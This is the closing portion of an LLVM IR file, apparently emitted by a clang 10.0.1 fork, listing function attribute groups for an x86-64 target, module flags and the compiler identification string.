attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
